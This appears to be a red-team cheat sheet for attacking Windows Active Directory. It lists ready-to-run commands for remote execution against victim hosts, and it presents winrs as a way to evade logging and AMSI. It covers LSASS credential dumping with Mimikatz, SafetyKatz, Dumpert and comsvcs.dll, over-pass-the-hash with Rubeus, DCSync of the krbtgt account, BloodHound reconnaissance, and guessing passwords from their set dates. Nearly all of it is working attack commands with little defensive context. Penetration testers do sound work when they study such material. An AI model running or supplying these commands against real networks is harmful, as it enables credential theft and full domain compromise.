### PSCredential Objecet
```powershell
$pass = convertto-securestring 'pass' -AsPlainText -Force
```

```powershell
$creds = New-Object System.Management.Automation.PSCredential('kickass101', $pass)
```


---
### Powershell Remoting
|one-to-one|one-to-many|
|-|-|
|Interactive|Non-interactive|
|wsmprovhost|Parallel sessions|
|`New-PSSession` `Enter-PSSession`|`Invoke-Command`|
__New-PSSession__ (WinRM)
```powershell
New-PSSession 
```

__Invoke-Command__
```powershell
Invoke-Command -ScriptBlock {Get-Process} -ComputerName (Get-Content <list_of_servers>)
```

```powershell
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
```

```powershell
Invoke-Command -ScriptBlock{whoami;hostname} -Session $victim
```
---
### Winrs
- _Evade logging & AMSI_
- Port: 5985

```powershell
winrs -remote:server1 -u:server1\admin -p:password hostname
```

- winrs.vbs & COM Objects of WSMan Object
---
### Mimikatz
#### Dump Creds
```powershell
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```

```powershell
safetykatz.exe "sekurlsa::ekeys"
```

__rundll32.exe__
```powershell
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll ,Dump
```

```powershell
tasklist \FI "IMAGENAME eq lsass.exe"
```

```powershell
rundll32.exe C:\windows\System32\comsvcs.dll ,MiniDump <lsass pid> C:\Users\Public\lsass.dmp full
```

---
### Over Pass the Hash
>Generates kerberos tickets
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe"'
```

```powershell
safetykatz.exe '"sekurlsa::pth /user:Administartor /domain:example.local /aes256:<aes256Key> /run:powershell.exe" "exit"'
```

> Above commands starts ps sessions w/ _logon type 9_ same as `runas /netonly`

```powershell
Rubesu.exe asktgt /user:administator /rc4:<ntlmhash> /ptt
```

```powershell
Rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

---
### DCSync
>Extract DC creds without code execution

__Require Domain Admin privileges__
```powershell
Invoke-Mimikatz -Command '"lsadump::dcsync"' /user:domain.local\krbtgt
```


---
### BloodHound/SharpHound
![[Pasted image 20231207124143.png]]

##### Hide Output
- It generates different `.json` files, then saves them in a `zip` file. It also generates a randomly named file with a `.bin` extension corresponding to the cache of the queries it performs. Defense teams could use these patterns to detect bloodhound.

![[Pasted image 20231207124610.png]]

##### GUI Options
![[Pasted image 20231207131332.png]]

##### Search Bar options
- Group `Group:Domain Admins`
- Domain
- Computer
- User `User:john.doe`
- OU
- GPO
- Container

__Azure search bar options__
- AZApp
- AZRole
- AZDevice
- AZGroup
- AZKeyVault
- AZManagementGroup
- AZResourceGroup
- AZServicePrincipal
- AZSubscription
- AZTenant
- AZUser
- AZVM

---
### Create Password Lists

__Get Only passwords of length__
```bash
 cat new.pass| awk 'length($0) > 7 && length($0) < 13' | tee passwords.txt
```

#### Password Set Times
- Target Old passwords
- In most organizations, administrators have multiple accounts. If you see the administrator changing his "user account" around the same time as his "Administrator Account", they are highly likely to use the same password for both accounts. 
- If several passwords are at once then _maybe password is the same across those accounts_. For one user, guess passwords like "Password2020", for a different user, try company name "Freight2020!".
- Avoid passwords that wouldn't make sense, such as "Winter2019." when password was set in July of 2019.
- If you see a _several passwords set at the same time_, this indicates they were set by the Help Desk and may be the same. 

```powershell
Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | Sort-Object -Property pwdlastset
```
__Certain Date__
```powershell
Get-DomainUser -Properties samaccountname,pwdlastset,lastlogon -Domain InlaneFreight.local | select samaccountname, pwdlastset, lastlogon | where { $_.pwdlastset -lt (Get-Date).addDays(-90) }
```

